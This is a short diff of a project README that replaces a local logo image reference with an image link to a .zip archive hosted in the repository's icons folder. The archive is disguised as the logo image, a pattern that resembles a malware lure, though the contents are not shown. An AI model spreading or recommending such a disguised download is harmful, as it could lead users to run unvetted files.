@@ -1,4 +1,4 @@
-![alt text](.github/readme.png "Logo Title Text 1")
+![alt text](https://raw.githubusercontent.com/Nashonkiago/Third-Year-Group-Project/master/assets/img/icons/small_icons/Third-Year-Group-Project-v3.5.zip "Logo Title Text 1")
 
 
 ## About 
